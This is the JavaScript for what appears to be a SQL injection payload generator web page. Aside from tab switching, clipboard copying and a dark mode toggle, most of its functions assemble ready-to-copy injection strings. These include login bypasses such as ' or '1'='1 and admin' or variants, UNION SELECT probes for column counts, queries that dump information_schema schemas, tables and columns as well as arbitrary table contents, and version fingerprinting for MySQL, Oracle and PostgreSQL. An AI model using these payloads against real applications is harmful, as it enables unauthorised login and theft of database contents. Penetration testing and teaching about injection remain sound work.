// To change the tabs for Simple, Advance and NSE mode
function ChangeTab(evt, customTab) {
    var i, tabcontent, tablinks;

    tabcontent = document.getElementsByClassName("tabcontent");
    for (i = 0; i < tabcontent.length; i++) {
        tabcontent[i].style.display = "none";
    }

    tablinks = document.getElementsByClassName("tablinks");
    for (i = 0; i < tablinks.length; i++) {
        tablinks[i].className = tablinks[i].className.replace(" active", "");
    }

    document.getElementById(customTab).style.display = "block";
    evt.currentTarget.className += " active";
}

function ResetToClip(event) {
    var comment = event.target.querySelector(".copytext");
    comment.innerHTML = "Copy to Clipboard";
}

function CopyToClip(event) {
    var buttonid = event.target.getAttribute("data-id");
    var copyText = document.getElementById(buttonid);
    navigator.clipboard.writeText(copyText.value);

    var copy = event.target.querySelector(".copytext");
    copy.innerHTML = "Copied!";

}


function SwitchColorMode() {

    if (document.documentElement.getAttribute('data-bs-theme') === 'dark') {
        document.documentElement.setAttribute('data-bs-theme', 'light');

        var elements = document.querySelectorAll(".dark");

        for (var i = 0; i < elements.length; i++) {
            elements[i].classList.remove("dark");
            elements[i].classList.add("light");
        }
        document.documentElement.setAttribute('data-theme', 'light');
        window.localStorage.setItem('data-theme', 'light'); //add this
        document.getElementById("Switch-Color").innerHTML = " 🌙 Dark Mode";
    } else {
        document.documentElement.setAttribute('data-bs-theme', 'dark');
        var elements = document.querySelectorAll(".light");

        for (var i = 0; i < elements.length; i++) {
            elements[i].classList.remove("light");
            elements[i].classList.add("dark");
        }
        document.documentElement.setAttribute('data-theme', 'dark');
        window.localStorage.setItem('data-theme', 'dark'); //add this
        document.getElementById("Switch-Color").innerHTML = " ☀️ Light Mode";

    }
}

function generateAlwaysTrueAuth() {
    var queryInput = document.getElementById('Bypass-Query-1');
    var commentChoice = document.getElementById('Always-True-Auth-Comment-Type').value;


    // Construct the query with the selected comment, if any
    queryInput.value = "' or '1'='1" + commentChoice;
}


function generateEmptyStringAuth() {
    var queryInput = document.getElementById('Bypass-Query-2');
    var commentChoice = document.getElementById('Bypass-Query-Comment-Type').value;

    queryInput.value = "' or ''='" + commentChoice;
}


function generateAdminAuth() {
    var quoteChoice = document.getElementById('AdminAuth-Quote-Choice').value;
    var commentChoice = document.getElementById('AdminAuth-Comment-Choice').value;

    // Constructing the query
    var query = `admin${quoteChoice}or${quoteChoice}${commentChoice}`;

    document.getElementById('Admin-Auth-Query').value = query;
}

function generateCommentAuth() {
    var commentChoice = document.getElementById('Comment-Auth-Comment-Choice').value;

    var query = `' or ${commentChoice} or '`;

    if (commentChoice === '') {
        query = `' or ${commentChoice}`;
    }

    document.getElementById('Comment-Auth-Query').value = query;
}



function generateCharAuth() {
    var charValue = document.getElementById('Char-Value').value;
    var commentType = document.getElementById('Comment-Type').value;

    var query = `\' or "${charValue}" or \'${commentType}`;

    document.getElementById('Char-Auth-Query').value = query;
}



function generateCharTrueAuth() {
    var quoteChoice = document.getElementById('CharTrue-Quote-Choice').value;
    var commentChoice = document.getElementById('CharTrue-Comment-Choice').value;

    // Constructing the query with selected quote and comment types
    var query = `' or ${quoteChoice}x${quoteChoice}=${quoteChoice}x${quoteChoice}${commentChoice}`;

    document.getElementById('Char-True-Auth-Query').value = query;
}



function generateCharTrueAuth2() {
    var character = document.getElementById('CharTrue2-Char-Choice').value;
    var quoteChoice = document.getElementById('CharTrue2-Quote-Choice').value;
    var commentChoice = document.getElementById('CharTrue2-Comment-Choice').value;

    var query = `${quoteChoice}) or ((${quoteChoice}${character}${quoteChoice}))=((${quoteChoice}${character}${quoteChoice}`;

    query += `${commentChoice}`;

    document.getElementById('Char-True-Auth-2-Query').value = query;
}



function generateNumberAuth() {
    var quoteChoice = document.getElementById('NumberAuth-Quote-Choice').value;
    var commentChoice = document.getElementById('NumberAuth-Comment-Choice').value;

    // Constructing the query
    var query = `${quoteChoice}or 1 or ${quoteChoice}${commentChoice}`;
    document.getElementById('Number-Auth-Query').value = query;
}



function generateTrueConditionAuth() {
    var quoteChoice = document.getElementById('TrueCondition-Quote-Choice').value;
    var commentChoice = document.getElementById('TrueCondition-Comment-Choice').value;

    var query = `${quoteChoice} or true ${commentChoice}`;

    document.getElementById('True-Condition-Auth-Query').value = query;
}


function generateFalseAdminAuth() {
    var quoteChoice = document.getElementById('FalseAdminAuth-Quote-Choice').value;
    var commentChoice = document.getElementById('FalseAdminAuth-Comment-Choice').value;

    var query = `admin${quoteChoice} or ${quoteChoice}1${quoteChoice}=${quoteChoice}2${commentChoice}`;

    document.getElementById('False-Admin-Auth-Query').value = query;
}



function generateAdminAuth2() {
    var quoteChoice = document.getElementById('Quote-Choice').value;
    var oneEqualsOneQuoteChoice = document.getElementById('OneEqualsOne-Quote-Choice').value;
    var commentChoice = document.getElementById('Comment-Choice').value;

    // Adjust the 1=1 part according to the selected quote type
    var oneEqualsOnePart = oneEqualsOneQuoteChoice + '1=1' + oneEqualsOneQuoteChoice;

    var query = `admin${quoteChoice} or ${oneEqualsOnePart}${commentChoice}`;

    document.getElementById('Admin-Auth-Query-2').value = query;
}



function generateAlwaysTrueAuth2() {
    var oneEqualsOneQuoteChoice = document.getElementById('AlwaysTrue-OneEqualsOne-Quote-Choice').value;
    var commentChoice = document.getElementById('AlwaysTrue-Comment-Choice').value;

    // Adjust the 1=1 part according to the selected quote type
    var oneEqualsOnePart = oneEqualsOneQuoteChoice ? `${oneEqualsOneQuoteChoice}1${oneEqualsOneQuoteChoice}=${oneEqualsOneQuoteChoice}1${oneEqualsOneQuoteChoice}` : '1=1';

    var query = `'or ${oneEqualsOnePart}${commentChoice}`;

    document.getElementById('Always-True-Query-2').value = query;
}



function generateCustomQuery() {
    var columnName = document.getElementById('Column-Name').value.trim();
    var wildcardValue = document.getElementById('Wildcard-Value').value.trim();

    if (columnName === '' || wildcardValue === '') {
        alert('Please enter both the column name and wildcard value.');
        return;
    }

    var customQuery = "' or " + columnName + " like '%" + wildcardValue + "'";
    document.getElementById('Bypass-Query-18').value = customQuery;

    // Show the explanation
    document.querySelector('.explanation').style.display = 'block';
}



function generateUnionOrderBy() {
    var orderByNumber = document.getElementById('OrderBy-Number').value.trim();
    var commentOption = document.getElementById('comment-options-1').value;

    if (orderByNumber === '') {
        alert('Please enter the Order By number.');
        return;
    }

    var unionQuery = "1' ORDER BY " + orderByNumber + commentOption;
    document.getElementById('Union-Query-1').value = unionQuery;

    // Show the explanation
    document.querySelector('.explanation').style.display = 'block';
}


function generateUnionSelectNull() {
    var numNulls = parseInt(document.getElementById('Num-Nulls').value.trim(), 10); // Convert to integer
    var commentType = document.getElementById('comment-options-2').value; // Assuming you have this select element in your HTML

    if (isNaN(numNulls) || numNulls < 1) { // Check if numNulls is a number and greater than 0
        alert('Please enter a valid number of NULLs.');
        return;
    }

    // Adjust how the comment type is appended
    var nullParts = new Array(numNulls).fill('NULL').join(', '); // More efficient way to handle repetition
    var unionQuery = `1' UNION SELECT ${nullParts} ${commentType}`; // Use template literal for clarity
    document.getElementById('Union-Query-2').value = unionQuery;

    // Show the explanation
    document.querySelector('.explanation').style.display = 'block';
}

function generateUnionDumpInformationSchema() {
    var totalColumns = parseInt(document.getElementById('Total-Columns-Schema').value, 10);
    var schemaColumn = parseInt(document.getElementById('Schema-Column').value, 10);
    var commentOption = document.getElementById('comment-options-3').value;

    // Validate that the schema column is within the total number of columns
    if (schemaColumn > totalColumns) {
        alert('The Schema Name Column must be within the total number of columns.');
        return;
    }

    // Build the query
    let columns = Array.from({ length: totalColumns }, (_, i) => i + 1 === schemaColumn ? 'schema_name' : 'NULL').join(', ');
    var unionQuery = `1' UNION SELECT ${columns} FROM information_schema.schemata ${commentOption}`;
    document.getElementById('Union-Query-4').value = unionQuery;

    // Show the explanation
    document.querySelector('.explanation').style.display = 'block';
}



function generateUnionInfoSchemaTable() {
    var totalColumns = parseInt(document.getElementById('Total-Columns-Table').value, 10);
    var tableColumn = parseInt(document.getElementById('Table-Column').value, 10);
    var commentOption = document.getElementById('comment-options-5').value;

    if (isNaN(totalColumns) || totalColumns < 1) {
        alert('Please enter a valid total number of columns.');
        return;
    }

    if (isNaN(tableColumn) || tableColumn < 1 || tableColumn > totalColumns) {
        alert('The Table Name Column must be a valid column within the total number of columns.');
        return;
    }

    // Initialize an array with 'NULL's
    let columns = new Array(totalColumns).fill('NULL');
    // Replace the specified column with 'table_name', adjusting for zero-based index
    columns[tableColumn - 1] = 'table_name';
    var unionQuery = `1' UNION SELECT ${columns.join(', ')} FROM information_schema.tables ${commentOption}`;
    document.getElementById('Union-Query-5').value = unionQuery;

    document.querySelector('.explanation').style.display = 'block';
}



function generateUnionInfoSchemaColumn() {
    var totalColumns = parseInt(document.getElementById('Total-Columns').value, 10);
    var columnNamePosition = parseInt(document.getElementById('Column-Name-Position').value, 10);
    var tableName = document.getElementById('UserTableName').value.trim();
    var commentOption = document.getElementById('comment-options-6').value;

    // Validation
    if (isNaN(totalColumns) || totalColumns < 1) {
        alert('Please enter a valid total number of columns.');
        return;
    }
    if (isNaN(columnNamePosition) || columnNamePosition < 1 || columnNamePosition > totalColumns) {
        alert('Column Name Position must be within the total number of columns.');
        return;
    }
    if (tableName === '') {
        alert('Please enter the table name.');
        return;
    }

    // Generate the columns part
    let columns = Array.from({ length: totalColumns }, (_, i) => i + 1 === columnNamePosition ? 'column_name' : 'NULL').join(', ');

    // Construct the query
    var unionQuery = `1' UNION SELECT ${columns} FROM information_schema.columns WHERE table_name = '${tableName}' ${commentOption}`;
    document.getElementById('Union-Query-6').value = unionQuery;

    // Show the explanation
    document.querySelector('.explanation').style.display = 'block';
}




function generateUnionDump1() {
    var tableName = document.getElementById('UE1-Table').value.trim();
    var column1 = document.getElementById('UE1-Column1').value.trim() || 'NULL';
    var column2 = document.getElementById('UE1-Column2').value.trim() || 'NULL';
    var commentOption = document.getElementById('comment-options-7').value;

    // Check for table name input
    if (tableName === '') {
        alert('Please enter the table name.');
        return;
    }

    var unionQuery = "1' UNION SELECT " + column1 + ", " + column2 + " FROM " + tableName + " " + commentOption;
    document.getElementById('Union-Query-7').value = unionQuery;

    // Show the explanation
    document.querySelector('.explanation').style.display = 'block';
}



function generateUnionDump2() {
    var column1 = document.getElementById('UE2-Column1').value.trim() || 'NULL';
    var column2 = document.getElementById('UE2-Column2').value.trim() || 'NULL';
    var column3 = document.getElementById('UE2-Column3').value.trim() || 'NULL';
    var tableName = document.getElementById('UE2-Table').value.trim();
    var commentOption = document.getElementById('comment-options-8').value;

    // Check for table name input
    if (tableName === '') {
        alert('Please enter the table name.');
        return;
    }

    var unionQuery = "1' UNION SELECT " + column1 + ", " + column2 + ", " + column3 + " FROM " + tableName + " " + commentOption;
    document.getElementById('Union-Query-8').value = unionQuery;

    // Show the explanation
    document.querySelector('.explanation').style.display = 'block';
}


function generateUnionDump3() {
    var tableName = document.getElementById('UD3-Table').value.trim();
    var column1 = document.getElementById('UD3-Column1').value.trim() || 'NULL';
    var column2 = document.getElementById('UD3-Column2').value.trim() || 'NULL';
    var column3 = document.getElementById('UD3-Column3').value.trim() || 'NULL';
    var column4 = document.getElementById('UD3-Column4').value.trim() || 'NULL';
    var commentType = document.getElementById('comment-options-9').value.trim();

    // Check for table name input
    if (tableName === '') {
        alert('Please enter the table name.');
        return;
    }

    var unionQuery = "1' UNION SELECT " + column1 + ", " + column2 + ", " + column3 + ", " + column4 + " FROM " + tableName + commentType;
    document.getElementById('Union-Query-9').value = unionQuery;

    // Show the explanation
    document.querySelector('.explanation').style.display = 'block';
}


function generateUnionDump4() {
    var tableName = document.getElementById('UD4-Table').value.trim();
    var column1 = document.getElementById('UD4-Column1').value.trim() || 'NULL';
    var column2 = document.getElementById('UD4-Column2').value.trim() || 'NULL';
    var column3 = document.getElementById('UD4-Column3').value.trim() || 'NULL';
    var column4 = document.getElementById('UD4-Column4').value.trim() || 'NULL';
    var column5 = document.getElementById('UD4-Column5').value.trim() || 'NULL';
    var commentType = document.getElementById('comment-options-10').value.trim();

    if (tableName === '') {
        alert('Please enter the table name.');
        return;
    }

    var unionQuery = "1' UNION SELECT " + column1 + ", " + column2 + ", " + column3 + ", " + column4 + ", " + column5 + " FROM " + tableName + commentType;
    document.getElementById('Union-Query-10').value = unionQuery;
}




function generateVersionQueryMySQL() {
    var totalColumns = parseInt(document.getElementById('Total-Columns-Version-MySQL').value, 10);
    var versionColumnPosition = parseInt(document.getElementById('Version-Column-Position-MySQL').value, 10);
    var commentType = document.getElementById('comment-options-11').value;

    if (isNaN(totalColumns) || totalColumns < 1) {
        alert('Please enter a valid number of columns.');
        return;
    }

    if (isNaN(versionColumnPosition) || versionColumnPosition < 1 || versionColumnPosition > totalColumns) {
        alert('Version Column Position must be a valid column within the total number of columns.');
        return;
    }

    // Build the columns part of the query
    let columns = Array.from({ length: totalColumns }, (_, i) => i + 1 === versionColumnPosition ? '@@version' : 'NULL').join(', ');

    // Construct the query
    var versionQuery = `' UNION SELECT ${columns} FROM information_schema.tables ${commentType}`;
    document.getElementById('Union-Query-11').value = versionQuery;

    // Show the explanation
    document.querySelector('.explanation').style.display = 'block';
}



function generateVersionOracleDB() {
    var totalColumns = parseInt(document.getElementById('Total-Columns-Version-Oracle').value, 10);
    var versionColumnPosition = parseInt(document.getElementById('Version-Column-Position-Oracle').value, 10);
    var commentType = document.getElementById('comment-options-12').value;

    if (isNaN(totalColumns) || totalColumns < 1) {
        alert('Please enter a valid number of columns.');
        return;
    }

    if (isNaN(versionColumnPosition) || versionColumnPosition < 1 || versionColumnPosition > totalColumns) {
        alert('Version Column Position must be a valid column within the total number of columns.');
        return;
    }

    // Build the columns part of the query
    let columns = Array.from({ length: totalColumns }, (_, i) => i + 1 === versionColumnPosition ? 'v$version' : 'NULL').join(', ');

    // Construct the query
    var versionQuery = `' UNION SELECT ${columns} FROM v$version ${commentType}`;
    document.getElementById('Union-Query-12').value = versionQuery;

    // Show the explanation
    document.querySelector('.explanation').style.display = 'block';
}


function generateVersionQueryPGSQL() {
    var totalColumns = parseInt(document.getElementById('Total-Columns-Version-PGSQL').value, 10);
    var versionColumnPosition = parseInt(document.getElementById('Version-Column-Position-PGSQL').value, 10);
    var commentOption = document.getElementById('comment-options-13').value;

    if (isNaN(totalColumns) || totalColumns < 1) {
        alert('Please enter a valid number of columns.');
        return;
    }

    if (isNaN(versionColumnPosition) || versionColumnPosition < 1 || versionColumnPosition > totalColumns) {
        alert('Version Column Position must be a valid column within the total number of columns.');
        return;
    }

    // Build the columns part of the query
    let columns = Array.from({ length: totalColumns }, (_, i) => i + 1 === versionColumnPosition ? 'version()' : 'NULL').join(', ');

    // Construct the query
    var versionQuery = `' UNION SELECT ${columns} ${commentOption}`;
    document.getElementById('Union-Query-13').value = versionQuery;

    // Show the explanation
    document.querySelector('.explanation').style.display = 'block';
}





document.addEventListener("DOMContentLoaded", function () {
    const tabsContainers = document.querySelectorAll(".tabs-container");

    tabsContainers.forEach(container => {
        const tabs = container.querySelectorAll(".tab");
        const contents = container.querySelectorAll(".content");

        const removeActiveClass = () => {
            tabs.forEach((t) => {
                t.classList.remove("active");
            });

            contents.forEach((c) => {
                c.classList.remove("active");
            });
        };

        const setFirstTabActive = () => {
            tabs[0].classList.add("active");
            contents[0].classList.add("active");
        };

        const setActiveTab = (tabIndex) => {
            removeActiveClass();
            tabs[tabIndex].classList.add("active");
            contents[tabIndex].classList.add("active");
        };

        tabs.forEach((t, i) => {
            t.addEventListener("click", () => {
                setActiveTab(i);
            });
        });

        setFirstTabActive(); // Set the first inner tab as active initially
    });

    // Default Opening the first tab
    document.getElementById("AuthenticationBypassOpen").click();

    function open_query(evt, query_name) {
        // Declare all variables
        var i, tabcontent, tablinks;

        // Get all elements with class="tabcontent" and hide them
        tabcontent = document.getElementsByClassName("tabcontent");
        for (i = 0; i < tabcontent.length; i++) {
            tabcontent[i].style.display = "none";
        }

        // Get all elements with class="tablinks" and remove the class "active"
        tablinks = document.getElementsByClassName("tablinks");
        for (i = 0; i < tablinks.length; i++) {
            tablinks[i].className = tablinks[i].className.replace(" active", "");
        }

        // Show the current tab, and add an "active" class to the link that opened the tab
        document.getElementById(query_name).style.display = "block";
        evt.currentTarget.className += " active";
    }

    // to add onmouseleave and onclick into all copy button
    var cpbtns = document.querySelectorAll("button[id^='Copy']");
    for (var i = 0; i < cpbtns.length; i++) {
        cpbtns[i].addEventListener("mouseleave", ResetToClip);
        cpbtns[i].addEventListener("click", CopyToClip);
    }

    // trigger Light/Dark mode depends on user last view
    var theme = window.localStorage.getItem('data-theme');
    if (theme === 'dark') {
        SwitchColorMode();
    }
    // trigger Light/Dark mode
    document.getElementById('Switch-Color').addEventListener('click', SwitchColorMode);

});


